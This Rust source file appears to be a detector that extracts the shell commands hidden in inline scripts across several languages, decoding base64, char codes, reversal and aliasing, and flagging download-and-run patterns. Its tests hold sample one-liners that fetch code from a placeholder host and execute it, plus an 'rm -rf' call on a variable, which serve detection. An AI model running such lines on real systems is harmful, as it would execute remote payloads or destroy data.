            if open == "{" && rest[at + 1..].starts_with('{') {
                out.push_str(&rest[..at + 1]);
                rest = &rest[at + 2..];
                continue;
            }
            out.push_str(&rest[..at]);
            let after = &rest[at + open.len()..];
            let Some(end) = closing(after) else {
                out.push(UNREAD);
                return out;
            };
            let mut expression = &after[..end];
            if open == "{" {
                // Python's `{x!r:>10}`: the expression only.
                expression = expression.split(['!', ':']).next().unwrap_or(expression);
            }
            out.push_str(&self.fold(expression, depth.saturating_sub(1)).text());
            rest = &after[end + 1..];
        }
        if open == "{" {
            out.push_str(&rest.replace("}}", "}"));
        } else {
            out.push_str(rest);
        }
        out
    }

    /// Perl's and PHP's names in a string: the sigil and the name, the name
    /// in braces after the sigil, or PHP's sigil and name in braces.
    fn sigil_fill(&self, text: &str) -> String {
        let mut out = String::new();
        let bytes = text.as_bytes();
        let mut at = 0;
        while at < bytes.len() {
            let braced_php = bytes[at] == b'{' && bytes.get(at + 1) == Some(&b'$');
            if matches!(bytes[at], b'$' | b'@') || braced_php {
                let sigil_at = if braced_php { at + 1 } else { at };
                let mut start = sigil_at + 1;
                let braced = bytes.get(start) == Some(&b'{');
                if braced {
                    start += 1;
                }
                let mut end = start;
                while end < bytes.len()
                    && (bytes[end].is_ascii_alphanumeric() || bytes[end] == b'_')
                {
                    end += 1;
                }
                if end > start {
                    let name = format!("{}{}", bytes[sigil_at] as char, &text[start..end]);
                    let value = self.vars.get(&name).cloned().unwrap_or(Value::Unknown);
                    out.push_str(&match value {
                        Value::List(items) => {
                            items.iter().map(Value::text).collect::<Vec<_>>().join(" ")
                        }
                        other => other.text(),
                    });
                    at = end;
                    if (braced || braced_php) && bytes.get(at) == Some(&b'}') {
                        at += 1;
                    }
                    continue;
                }
            }
            let character = text[at..].chars().next().unwrap_or(' ');
            out.push(character);
            at += character.len_utf8();
        }
        out
    }
}

/// The functions code defines, with their parameters: Python's and Ruby's
/// `def name(a, b)`, JavaScript's and PHP's `function name(a, b)`, and
/// JavaScript's `const name = (a, b) =>` or `const name = a =>`.
fn defined_functions(lang: Lang, code: &str) -> Vec<(String, Vec<String>)> {
    let keyword = match lang {
        Lang::Python | Lang::Ruby => "def ",
        Lang::Js | Lang::Php | Lang::Lua => "function ",
        Lang::Perl => return Vec::new(),
    };
    let parameters_of = |text: &str| -> Vec<String> {
        text.split(',')
            .filter_map(|parameter| {
                let parameter = parameter.trim().trim_start_matches(['*', '&']);
                let parameter = parameter.split(['=', ':']).next().unwrap_or("").trim();
                (!parameter.is_empty() && parameter.bytes().all(is_name_byte))
                    .then(|| parameter.to_owned())
            })
            .collect()
    };
    let mut functions = Vec::new();
    for (at, _) in code.match_indices(keyword) {
        if code[..at].bytes().next_back().is_some_and(is_name_byte) {
            continue;
        }
        let rest = &code[at + keyword.len()..];
        let Some(open) = rest.find('(') else { continue };
        let name = rest[..open].trim();
        if name.is_empty() || !name.bytes().all(|b| is_name_byte(b) || b == b'.') {
            continue;
        }
        let Some(close) = closing(&rest[open + 1..]) else {
            continue;
        };
        functions.push((
            name.to_owned(),
            parameters_of(&rest[open + 1..open + 1 + close]),
        ));
    }
    if lang == Lang::Js {
        for (at, _) in code.match_indices("=>") {
            let before = code[..at].trim_end();
            let (parameters, head) = if let Some(inside) = before.strip_suffix(')') {
                let Some(open) = inside.rfind('(') else {
                    continue;
                };
                (&inside[open + 1..], inside[..open].trim_end())
            } else {
                let start = before
                    .rfind(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '$'))
                    .map_or(0, |at| at + 1);
                (&before[start..], before[..start].trim_end())
            };
            let Some(head) = head.strip_suffix('=') else {
                continue;
            };
            let head = head.trim_end();
            let start = head
                .rfind(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '$'))
                .map_or(0, |at| at + 1);
            let name = &head[start..];
            if !name.is_empty() {
                functions.push((name.to_owned(), parameters_of(parameters)));
            }
        }
    }
    functions
}

/// Where the quote that ends a string is, in `text` (what follows the
/// opening quote).
fn quoted_end(text: &str, quote: char, escapes: bool) -> Option<usize> {
    let mut escaped = false;
    for (at, character) in text.char_indices() {
        if escaped {
            escaped = false;
        } else if character == '\\' && escapes {
            escaped = true;
        } else if character == quote {
            return Some(at);
        }
    }
    None
}

/// A string body with its backslash escapes read.
fn unescaped(text: &str) -> String {
    let mut out = String::new();
    let mut characters = text.chars().peekable();
    while let Some(character) = characters.next() {
        if character != '\\' {
            out.push(character);
            continue;
        }
        let Some(escaped) = characters.next() else {
            out.push('\\');
            break;
        };
        match escaped {
            'n' => out.push('\n'),
            't' => out.push('\t'),
            'r' => out.push('\r'),
            '0' => out.push('\0'),
            'e' => out.push('\u{1b}'),
            'x' => {
                let digits: String = (0..2)
                    .filter_map(|_| characters.next_if(char::is_ascii_hexdigit))
                    .collect();
                match u32::from_str_radix(&digits, 16)
                    .ok()
                    .and_then(char::from_u32)
                {
                    Some(decoded) => out.push(decoded),
                    None => out.push_str(&digits),
                }
            }
            'u' => {
                let braced = characters.next_if_eq(&'{').is_some();
                let most = if braced { 6 } else { 4 };
                let digits: String = (0..most)
                    .filter_map(|_| characters.next_if(char::is_ascii_hexdigit))
                    .collect();
                if braced {
                    characters.next_if_eq(&'}');
                }
                if let Some(decoded) = u32::from_str_radix(&digits, 16)
                    .ok()
                    .and_then(char::from_u32)
                {
                    out.push(decoded);
                }
            }
            '\n' => {}
            other => out.push(other),
        }
    }
    out
}

fn chars_of(items: &[Value]) -> Value {
    let mut out = String::new();
    for item in items {
        match item {
            Value::Num(code) => match u32::try_from(*code).ok().and_then(char::from_u32) {
                Some(character) => out.push(character),
                None => return Value::Unknown,
            },
            Value::List(list) => out.push_str(&chars_of(list).text()),
            _ => out.push(UNREAD),
        }
    }
    capped(out)
}

fn rot13(text: &str) -> String {
    text.chars()
        .map(|character| match character {
            'a'..='z' => (((character as u8 - b'a') + 13) % 26 + b'a') as char,
            'A'..='Z' => (((character as u8 - b'A') + 13) % 26 + b'A') as char,
            other => other,
        })
        .collect()
}

fn percent_format(format: &str, values: &[Value]) -> String {
    let mut out = String::new();
    let mut values = values.iter();
    let mut characters = format.chars();
    while let Some(character) = characters.next() {
        if character != '%' {
            out.push(character);
            continue;
        }
        match characters.next() {
            Some('%') => out.push('%'),
            Some(_) => out.push_str(&values.next().map_or(UNREAD.to_string(), Value::text)),
            None => out.push('%'),
        }
    }
    out
}

fn brace_format(format: &str, values: &[Value]) -> String {
    let mut out = String::new();
    let mut next = 0usize;
    let mut rest = format;
    while let Some(at) = rest.find('{') {
        out.push_str(&rest[..at]);
        let after = &rest[at + 1..];
        let Some(end) = after.find('}') else {
            out.push_str(&rest[at..]);
            return out;
        };
        let field = after[..end].split([':', '!']).next().unwrap_or("");
        let index = field.parse::<usize>().unwrap_or_else(|_| {
            next += 1;
            next - 1
        });
        out.push_str(&values.get(index).map_or(UNREAD.to_string(), Value::text));
        rest = &after[end + 1..];
    }
    out.push_str(rest);
    out
}

/// `chr(c) for c in [...]`: the function applied and the list.
fn generator_over(inner: &str) -> Option<(&'static str, &str)> {
    let (head, tail) = inner.split_once(" for ")?;
    let (name, list) = tail.split_once(" in ")?;
    let (name, head) = (name.trim(), head.trim());
    let function = if head == name || head == format!("str({name})") {
        "str"
    } else if head == format!("chr({name})") {
        "chr"
    } else {
        return None;
    };
    Some((function, list.trim()))
}

/// A Python keyword argument, `name=value`.
fn keyword_argument(lang: Lang, part: &str) -> Option<(&str, &str)> {
    if lang != Lang::Python {
        return None;
    }
    let end = part
        .bytes()
        .position(|b| !(b.is_ascii_alphanumeric() || b == b'_'))?;
    if end == 0 {
        return None;
    }
    let value = part[end..].trim_start().strip_prefix('=')?;
    (!value.starts_with('=')).then(|| (&part[..end], value))
}

/// A Ruby option, `chdir: "/"` or `:chdir => "/"`.
fn ruby_option(part: &str) -> bool {
    let end = part
        .bytes()
        .position(|b| !(b.is_ascii_alphanumeric() || b == b'_'))
        .unwrap_or(0);
    (end > 0 && part[end..].starts_with(": ")) || (part.starts_with(':') && part.contains("=>"))
}

/// A Ruby or Perl statement modifier (`if`, `unless`) ends a call made
/// without brackets.
fn trailing_modifier_cut(text: &str) -> &str {
    for keyword in [" if ", " unless ", " or ", " and ", " while "] {
        let parts = split_top(text, keyword);
        if parts.len() > 1 {
            return parts[0];
        }
    }
    text
}

/// An option's value in an object: up to the next top-level comma or the
/// end of the object.
fn option_value(value: &str) -> &str {
    let value = closing(value).map_or(value, |close| &value[..close]);
    split_top(value, ",")[0]
}

/// The file in `open(path).read()`, `File.read(path)` and the like, when
/// the path is written out.
fn opened_file(argument: &str) -> Option<String> {
    let argument = argument.trim();
    for opener in [
        "open(",
        "File.read(",
        "IO.read(",
        "file_get_contents(",
        "fs.readFileSync(",
        "readFileSync(",
        "Deno.readTextFileSync(",
    ] {
        if let Some(rest) = argument.strip_prefix(opener) {
            let (path, _) = simple_quoted(rest.trim_start())?;
            return Some(path.to_owned());
        }
    }
    None
}

fn looks_like_path(text: &str) -> bool {
    text.starts_with('/')
        || text.starts_with("./")
        || text.starts_with("../")
        || text.starts_with("~/")
        || (text.contains('.') && !text.contains("://") && !text.contains(' ') && text.len() < 256)
}

fn same_path(first: &str, second: &str) -> bool {
    let clean = |path: &str| path.trim().trim_start_matches("./").to_owned();
    !first.trim().is_empty() && clean(first) == clean(second)
}

/// A word of a program's arguments as the shell reads it back; a piece not
/// read stands as an expansion in double quotes.
fn rendered_word(value: &Value) -> String {
    match value {
        Value::Str(text) if !text.contains(UNREAD) => shell_quoted(text),
        Value::Str(text) => {
            let mut out = String::from("\"");
            for character in text.chars() {
                match character {
                    UNREAD => out.push_str(UNREAD_WORD),
                    '"' | '\\' | '$' | '\u{60}' => {
                        out.push('\\');
                        out.push(character);
                    }
                    other => out.push(other),
                }
            }
            out.push('"');
            out
        }
        Value::Num(number) => number.to_string(),
        Value::List(_) | Value::Unknown => format!("\"{UNREAD_WORD}\""),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn read(lang: Lang, code: &str) -> InlineReading {
        read_code(lang, code, CODE_DEPTH)
    }

    #[test]
    fn a_line_built_from_written_values_is_read() {
        for (lang, code, line) in [
            (
                Lang::Python,
                "import os; os.system(' '.join(['ls','-la']))",
                "ls -la",
            ),
            (
                Lang::Python,
                "import os; d='/srv'; os.system(f'ls {d}')",
                "ls /srv",
            ),
            (
                Lang::Python,
                "import os,base64; os.system(base64.b64decode('bHMgLWxh').decode())",
                "ls -la",
            ),
            (
                Lang::Python,
                "import os; os.system(''.join(map(chr,[108,115])))",
                "ls",
            ),
            (
                Lang::Python,
                "import os; os.system(''.join(chr(c) for c in [108,115]))",
                "ls",
            ),
            (Lang::Python, "import os; os.system('sl'[::-1])", "ls"),
            (
                Lang::Python,
                "import os; os.system('ls %s' % '/srv')",
                "ls /srv",
            ),
            (
                Lang::Python,
                "import os; os.system('ls {}'.format('/srv'))",
                "ls /srv",
            ),
            (Lang::Python, "from os import system as s; s('ls')", "ls"),
            (
                Lang::Python,
                "import subprocess as sp; sp.call('ls', shell=True)",
                "ls",
            ),
            (Lang::Python, "import os; getattr(os,'system')('ls')", "ls"),
            (Lang::Python, "c='ls'; __import__('os').system(c)", "ls"),
            (Lang::Python, "import os; f=os.system; f('ls')", "ls"),
            (
                Lang::Js,
                "require('child_process').execSync(String.fromCharCode(108,115))",
                "ls",
            ),
            (
                Lang::Js,
                "require('child_process').execSync(Buffer.from('bHM=','base64').toString())",
                "ls",
            ),
            (
                Lang::Js,
                "require('child_process').execSync(atob('bHM='))",
                "ls",
            ),
            (
                Lang::Js,
                "const d='/srv'; require('child_process').execSync(\u{60}ls \x24{d}\u{60})",
                "ls /srv",
            ),
            (
                Lang::Js,
                "require('child_process').execSync(['ls','-la'].join(' '))",
                "ls -la",
            ),
            (Lang::Ruby, "d='/srv'; system(\"ls #{d}\")", "ls /srv"),
            (Lang::Ruby, "Kernel.send(:system, 'ls')", "ls"),
            (
                Lang::Ruby,
                "require 'base64'; system(Base64.decode64('bHM='))",
                "ls",
            ),
            (Lang::Perl, "system(join(' ','ls','-la'))", "ls -la"),
            (Lang::Perl, "system(decode_base64('bHM='))", "ls"),
            (Lang::Php, "system(implode(' ',['ls','-la']));", "ls -la"),
            (Lang::Php, "$f='system'; $f('ls');", "ls"),
            (Lang::Php, "shell_exec(base64_decode('bHM='));", "ls"),
            (
                Lang::Js,
                "new Deno.Command('ls',{args:['-la']}).outputSync()",
                "ls -la",
            ),
            (Lang::Lua, "os.execute(table.concat({'ls'}, ' '))", "ls"),
        ] {
            let reading = read(lang, code);
            assert!(
                reading.lines.iter().any(|l| l == line),
                "{code}: {reading:?}"
            );
            assert!(!reading.unread, "{code}: {reading:?}");
        }
    }

    #[test]
    fn a_program_the_code_does_not_write_out_is_unread() {
        for (lang, code) in [
            (Lang::Python, "import os,sys; os.popen(sys.argv[1]).read()"),
            (
                Lang::Python,
                "import subprocess,sys; subprocess.run(sys.argv[1:])",
            ),
            (
                Lang::Js,
                "const c=process.argv[1]; require('child_process').execSync(c)",
            ),
            (Lang::Ruby, "c=ARGV[0]; \u{60}#{c}\u{60}"),
            (Lang::Perl, "$c=shift; system($c)"),
            (Lang::Php, "$c=$argv[1]; passthru($c);"),
        ] {
            assert!(read(lang, code).unread, "{code}");
        }
        // A program written out with an argument that is not: judged as a
        // shell line with a variable.
        let reading = read(
            Lang::Js,
            "const d=process.env.D; require('child_process').spawnSync('rm',['-rf',d])",
        );
        assert!(!reading.unread, "{reading:?}");
        assert!(
            reading.lines.contains(&"rm -rf \"$IW_UNREAD\"".to_owned()),
            "{reading:?}"
        );
        // A helper's parameter is what its calls hand it.
        let reading = read(
            Lang::Python,
            "import subprocess\ndef sh(c):\n    return subprocess.run(c, shell=True).stdout\nprint(sh('git status'))\nsh('ls -la')",
        );
        assert!(!reading.unread, "{reading:?}");
        assert!(
            reading.lines.contains(&"git status".to_owned()),
            "{reading:?}"
        );
        assert!(reading.lines.contains(&"ls -la".to_owned()), "{reading:?}");
        let reading = read(
            Lang::Js,
            "const run = (c) => require('child_process').execSync(c); run('ls')",
        );
        assert!(
            !reading.unread && reading.lines.contains(&"ls".to_owned()),
            "{reading:?}"
        );
        // Called with what it does not write out, it stays unread.
        let reading = read(
            Lang::Python,
            "import subprocess,sys\ndef sh(c):\n    subprocess.run(c, shell=True)\nsh(sys.argv[1])",
        );
        assert!(reading.unread, "{reading:?}");
        // The interpreter itself is written out.
        let reading = read(
            Lang::Python,
            "import subprocess,sys; subprocess.run([sys.executable,'-m','pip','--version'])",
        );
        assert!(!reading.unread, "{reading:?}");
    }

    #[test]
    fn a_download_run_or_handed_to_a_process_is_seen() {
        for (lang, code) in [
            (Lang::Python, "import urllib.request,os; os.system(urllib.request.urlopen('https://x.example/p').read().decode())"),
            (Lang::Python, "import urllib.request as u; exec(u.urlopen('https://x.example/p').read())"),
            (Lang::Js, "fetch('https://x.example/p').then(r=>r.text()).then(eval)"),
            (Lang::Js, "fetch('https://x.example/p').then(r=>r.text()).then(t=>new Function(t)())"),
            (Lang::Js, "require('https').get('https://x.example/p',r=>r.pipe(require('child_process').spawn('sh').stdin))"),
            (Lang::Js, "require('child_process').execSync('curl -so /tmp/x.js https://x.example/p'); require('/tmp/x.js')"),
            (Lang::Ruby, "require 'open-uri'; system(URI.open('https://x.example/p').read)"),
            (Lang::Perl, "system(get('https://x.example/p'))"),
            (Lang::Php, "system(file_get_contents('https://x.example/p'));"),
            (Lang::Js, "await import('https://x.example/m.ts')"),
        ] {
            assert!(read(lang, code).runs_download, "{code}");
        }
        for (lang, code) in [
            (Lang::Js, "fetch('https://api.example.com').then(r=>r.json()).then(console.log)"),
            (Lang::Python, "import urllib.request; print(urllib.request.urlopen('https://pypi.org/').status)"),
            (Lang::Python, "import json,urllib.request; d=json.load(urllib.request.urlopen('https://x.example/a')); print(d)"),
        ] {
            assert!(!read(lang, code).runs_download, "{code}");
        }
    }

    #[test]
    fn a_data_url_is_decoded() {
        assert_eq!(
            data_url_body("data:text/javascript,a%20b").as_deref(),
            Some("a b")
        );
        assert_eq!(
            data_url_body("data:text/javascript;base64,bHM=").as_deref(),
            Some("ls")
        );
    }
}
